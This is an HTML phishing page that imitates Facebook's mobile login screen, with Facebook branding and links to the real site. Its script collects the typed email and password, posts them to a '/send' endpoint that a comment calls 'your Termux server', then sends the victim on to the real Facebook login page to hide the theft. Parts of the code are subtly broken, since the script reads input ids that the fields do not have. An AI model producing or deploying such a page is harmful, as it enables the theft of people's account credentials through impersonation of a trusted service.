<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Login</title>
 <style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family: Helvetica, Arial, sans-serif;
}

body{
background:#ffffff;
display:flex;
justify-content:center;
align-items:center;
min-height:100vh;
padding:20px;
}

/* main container */
.container{
width:100%;
max-width:380px;
text-align:center;
padding:20px;
}

/* Top download text */
.top-text{
color:#1877f2;
font-size:14px;
margin-bottom:10px;
}

/* language */
.language{
color:#777;
font-size:14px;
margin-bottom:40px;
}

/* facebook logo */
.logo{
width:60px;
height:60px;
background:#1877f2;
border-radius:50%;
display:flex;
align-items:center;
justify-content:center;
margin:0 auto 40px auto;
color:white;
font-size:40px;
font-weight:bold;
}

/* input fields */
.input-box{
width:100%;
padding:16px;
border-radius:14px;
border:1px solid #ddd;
margin-bottom:15px;
font-size:16px;
}

/* login button */
.login-btn{
width:100%;
padding:14px;
background:#1877f2;
color:white;
border:none;
border-radius:30px;
font-size:18px;
font-weight:bold;
cursor:pointer;
margin-top:5px;
}

/* forgot password */
.forgot{
margin-top:18px;
color:#333;
font-size:15px;
text-decoration:none;
display:block;
}

/* create account */
.create{
margin-top:80px;
border:1px solid #1877f2;
padding:14px;
border-radius:30px;
color:#1877f2;
font-weight:bold;
text-decoration:none;
display:block;
}

/* meta footer */
.meta{
margin-top:20px;
color:#444;
font-weight:500;
font-size:15px;
}

/* 📱 Mobile screens */
@media (max-width:480px){

.container{
max-width:100%;
padding:15px;
}

.logo{
width:55px;
height:55px;
font-size:36px;
}

.input-box{
padding:14px;
font-size:15px;
}

.login-btn{
font-size:16px;
padding:13px;
}

.create{
margin-top:60px;
}

}

</style>
</head>

<body>

<div class="container">
  <div class="login-box">
   <a href="http://https://play.google.com/store/apps/details?id=com.facebook.katana&hl=en-US&pli=1"><div class="top-text">Get Facebook for Android and browse faster.</div></a>

    <div class="language">English (US)</div>

    <div class="logo">f</div>
    <!-- Email and Password fields -->
     <input class="input-box" type="text" placeholder="Mobile number or email">
     <input class="input-box" type="password" placeholder="Password">
    
    <button class="login-btn" onclick="send()">Log In</button>
    
    <!-- Additional links like Facebook -->
     <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjo1LCJjcmVhdGlvbl90aW1lIjoxNzcyOTU1OTAzfQ%3D%3D&ars=facebook_login" class="forgot">Forgot password?</a>

<a href="https://www.facebook.com/reg/?entry_point=login&next=" class="create">Create new account</a>

<div class="meta">Meta</div>
</div>

<script>
async function send() {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  // Send data to your Termux server
  await fetch("/send", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ email, password })
  });

  // Optional: clear inputs
  document.getElementById("email").value = "";
  document.getElementById("password").value = "";

  // Redirect user to the real Facebook login page
  window.location.href = "https://www.facebook.com/login.php";
}
</script>

</body>
</html>
